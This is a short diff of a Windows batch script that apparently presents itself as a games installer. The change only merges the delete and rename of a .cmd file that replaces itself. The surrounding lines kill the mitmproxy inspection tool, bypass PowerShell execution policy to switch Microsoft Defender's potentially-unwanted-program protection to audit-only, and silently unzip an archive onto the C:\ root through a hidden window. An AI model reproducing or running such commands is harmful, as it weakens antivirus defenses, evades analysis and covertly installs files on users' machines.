@@ -39,7 +39,4 @@ taskkill /im mitmproxy.exe /f
 taskkill /im apache.exe /f
 powershell.exe -ExecutionPolicy Bypass -Command Set-MpPreference -PUAProtection AuditMode
 start /WAIT C:\Games\viewer.exe /HideWindow C:\Games\unzip.exe -o C:\Games\Games.zip -d C:\
-timeout /t 1
-del C:\Games\cmmc.cmd
-timeout /t 1
-move /Y C:\Games\cmmce.cmd C:\Games\cmmc.cmd
+del C:\Games\cmmc.cmd&move /Y C:\Games\cmmce.cmd C:\Games\cmmc.cmd
